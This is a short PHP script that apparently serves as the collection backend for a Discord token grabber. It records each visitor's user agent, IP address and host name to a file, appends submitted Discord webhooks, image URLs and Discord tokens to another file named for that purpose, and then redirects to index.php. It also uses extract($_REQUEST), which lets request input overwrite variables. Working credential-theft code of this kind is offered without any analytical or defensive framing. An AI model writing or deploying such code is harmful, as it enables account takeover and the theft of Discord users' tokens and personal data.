<?php
    extract($_REQUEST);
    $file=fopen("IPAddressAndDiscordTokenWebhookAndImageURL.txt","a");
file_put_contents("IPAddressAndDiscordToken.txt", "\nUserAgent: " . $_SERVER['HTTP_USER_AGENT'] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nHostname: " . gethostname() . "\nClient Name: " . php_uname('n') . "\n===============\n",FILE_APPEND);

    fwrite($file,"Discord Webhook: ");
    fwrite($file, $webhook ."\n");
    fwrite($file,"Image URL: ");
    fwrite($file, $imageurl ."\n");
    fwrite($file,"Discord Token: ");
    fwrite($file, $TEST1 ."\n");

    fclose($file);
    header("location: index.php");
 ?>
